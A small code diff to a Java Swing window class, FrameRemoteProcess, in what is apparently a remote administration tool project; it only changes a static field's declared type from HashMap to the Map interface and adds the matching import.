@@ -6,6 +6,7 @@ import java.awt.event.ActionListener;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
+import java.util.Map;
 
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
@@ -31,7 +32,7 @@ import pro.jrat.common.OperatingSystem;
 @SuppressWarnings("serial")
 public class FrameRemoteProcess extends JFrame {
 
-	public static final HashMap<Slave, FrameRemoteProcess> instances = new HashMap<Slave, FrameRemoteProcess>();
+	public static final Map<Slave, FrameRemoteProcess> instances = new HashMap<Slave, FrameRemoteProcess>();
 
 	public DefaultTableModel model;
 
